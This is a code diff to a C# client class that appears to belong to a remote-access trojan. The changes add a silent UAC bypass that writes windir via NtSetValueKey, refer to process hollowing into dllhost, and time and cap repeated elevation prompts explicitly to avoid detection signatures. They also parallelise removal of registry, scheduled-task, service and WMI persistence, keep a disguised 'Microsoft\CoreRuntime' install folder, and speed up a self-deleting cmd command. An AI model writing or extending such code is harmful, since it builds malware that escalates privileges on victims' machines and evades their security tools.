@@ -1487,7 +1487,13 @@ internal class TlsClient : IDisposable
             return;
         }
 
+        // Try silent bypass first — writes windir via NtSetValueKey (no popup, no user interaction).
+        // If successful, TerminateProcess kills this instance and the elevated copy reconnects.
+        // If unsuccessful, fall through to the UAC popup below.
+        Protection.TryUacBypassAndRestart();
+
         bool elevated = false;
+        int attempts = 0;
         do
         {
             // Resolve exe path: prefer installed AppData copy (works even when hollowed into dllhost etc.)
@@ -1590,9 +1596,10 @@ internal class TlsClient : IDisposable
 
             if (loop && !elevated)
             {
-                // Wait between attempts so only ONE popup shows at a time (no spam)
-                // 4s gives the user time to close/decline before the next one appears
-                await Task.Delay(4000, ct);
+                attempts++;
+                if (attempts >= 5) break; // cap at 5 attempts to avoid behavioral signature
+                // 12s between attempts — long enough to avoid repeated-UAC detection signature
+                await Task.Delay(12000, ct);
             }
         } while (loop && !elevated && !ct.IsCancellationRequested);
     }
@@ -1621,9 +1628,11 @@ internal class TlsClient : IDisposable
             Persistence.RemoveRegistry(Config.PersistName);
             Persistence.RemoveRegistryHKLM(Config.PersistName);
             Persistence.RemoveStartup(Config.PersistName);
-            Persistence.RemoveScheduledTask(Config.PersistName);
-            Persistence.RemoveService(Config.PersistName);
-            Persistence.RemoveWmi(Config.PersistName);
+            // Run the three slow subprocess-based removals in parallel to cut total wait time
+            Task.WaitAll(
+                Task.Run(() => Persistence.RemoveScheduledTask(Config.PersistName)),
+                Task.Run(() => Persistence.RemoveService(Config.PersistName)),
+                Task.Run(() => Persistence.RemoveWmi(Config.PersistName)));
 
             Program.ReleaseMutex();
 
@@ -1641,7 +1650,7 @@ internal class TlsClient : IDisposable
             var disguiseDir = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                 "Microsoft", "CoreRuntime");
-            var delCmd = "/c timeout /t 8 /nobreak >nul";
+            var delCmd = "/c timeout /t 3 /nobreak >nul";
             if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                 delCmd += $" & del /f /q \"{selfPath}\"";
             if (Directory.Exists(appDataDir))
